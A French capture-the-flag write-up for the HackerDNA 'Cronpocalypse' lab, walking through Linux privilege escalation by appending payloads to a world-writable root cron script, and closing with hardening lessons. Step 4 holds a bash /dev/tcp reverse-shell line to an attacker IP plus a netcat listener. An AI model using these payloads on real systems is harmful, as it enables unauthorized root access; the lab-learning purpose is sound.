# Compte rendu : Cronpocalypse
Plateforme : HackerDNA ( https://hackerdna.com/labs/cronpocalypse )
Auteur : SRH
Catégorie : Privilege Escalation & Post-Exploitation
Difficulté : Moyenne
Tags : SSH, Cron, Cron Job Hijacking, Privilège Escalation
XP : +200 XP

## Scénario
Hijack un job qui tourne sur un timer et monte jusqu'à root.

Objectif : se connecter en SSH, trouver le job que le système exécute en tant que root, et le détourner pour obtenir un accès root.

Prérequis : SSH, Linux, Cron.

## Chaîne d'Attaque
[Connexion SSH] → [Énumération] → [Découverte du Cron Job root] → [Script world-writable / modifiable] → [Hijack du job] → [Attente du prochain tick] → [Shell root] → 🚩

## Étape 1 — Connexion initiale
Connexion SSH avec les identifiants fournis par le lab :

```bash
ssh [USER]@[IP_CIBLE]
```

Vérification de l'utilisateur courant :

```bash
whoami
id
pwd
```

## Étape 2 — Énumération
Recherche des jobs planifiés :

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/ /etc/cron.daily/
crontab -l
```

Recherche des fichiers appartenant à root mais modifiables :

```bash
find /etc/cron* -type f -ls
ls -la /opt/ /usr/local/bin/ 2>/dev/null
```

## Étape 3 — Découverte du Cron Job vulnérable
Exemple de ligne trouvée dans `/etc/crontab` :

```
* * * * * root /opt/backup.sh
```

Analyse :
- Le job tourne toutes les minutes
- Il tourne en tant que `root`
- Le script `/opt/backup.sh` est modifiable par l'utilisateur courant

Vérification des permissions :

```bash
ls -l /opt/backup.sh
```

Résultat :

```
-rwxrwxrwx 1 root root ... /opt/backup.sh
```

Le script est world-writable : n'importe quel utilisateur peut le modifier, mais il sera exécuté par root.

## Étape 4 — Hijack du Cron Job
Ajout d'une charge utile à la fin du script pour récupérer le flag root.

Option 1 - Copier le flag :

```bash
echo "cp /root/flag-root.txt /tmp/flag-root.txt; chmod 644 /tmp/flag-root.txt" >> /opt/backup.sh
```

Option 2 - Reverse shell (dans le terminal d'attaque, en écoute) :

```bash
nc -lvnp 4444
```

Puis dans le script :

```bash
echo "bash -i >& /dev/tcp/[IP_ATTAQUE]/4444 0>&1" >> /opt/backup.sh
```

## Étape 5 — Attente du prochain tick
Le cron s'exécute toutes les minutes. Il suffit d'attendre :

```bash
cat /opt/backup.sh
```

Puis vérification :

```bash
cat /tmp/flag-root.txt
```

Ou réception du shell root dans le listener netcat :

```bash
whoami
# root
id
# uid=0(root) gid=0(root)
```

## Étape 6 — Récupération des flags
Flag utilisateur :

```bash
cat ~/flag-user.txt
```

Flag root :

```bash
cat /root/flag-root.txt
# ou
cat /tmp/flag-root.txt
```

🚩 Flag User : FLAG{...}
🚩 Flag Root : FLAG{...}

## Conclusion
Ce lab illustre une faille classique de privilege escalation Linux :
- Un cron job qui tourne en root
- Qui exécute un script modifiable par un utilisateur non privilégié
- = Accès root au prochain tick

## Leçons Apprises
1. Un script exécuté par root ne doit jamais être world-writable.
2. Toujours vérifier `/etc/crontab` et `/etc/cron.d/` en premier en énumération.
3. Toujours vérifier les permissions avec `ls -l` sur les scripts de cron.
4. Utiliser des chemins absolus et des permissions `700` / `755` owned par root pour les jobs système.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
